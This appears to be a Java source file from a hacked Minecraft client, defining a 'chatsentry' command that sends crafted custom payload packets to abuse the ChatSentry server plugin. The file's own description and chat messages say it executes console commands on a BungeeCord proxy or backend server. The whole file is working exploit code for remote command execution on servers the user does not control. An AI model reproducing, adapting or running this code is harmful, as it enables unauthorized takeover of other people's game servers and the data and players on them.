package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.ChatSentryPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class ChatSentryCommand extends Command {
    public ChatSentryCommand(MinecraftClient minecraftClient) {
        super("chatsentry", "Executes bungee command through console!", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return SINGLE_SUCCESS;
                })
                .then(literal("bungee")
                        .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    Helper.sendPacket(new CustomPayloadC2SPacket(
                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), true, "")
                                    ));
                                    Helper.printChatMessage("Chat sentry bungee payload packet sent!");
                                    return SINGLE_SUCCESS;
                                })
                        ))
                .then(literal("backend")
                        .executes(context -> {
                            Helper.printChatMessage("Incomplete command!");
                            return SINGLE_SUCCESS;
                        })
                        .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    Helper.sendPacket(new CustomPayloadC2SPacket(
                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), false, "config")
                                    ));

                                    Helper.sendPacket(new CustomPayloadC2SPacket(
                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), false, "module")
                                    ));
                                    Helper.printChatMessage("Chat sentry backend payload packet sent! Type SpigotRCEOnTop to execute console command!");
                                    return SINGLE_SUCCESS;
                                })
                        ));

    }
}
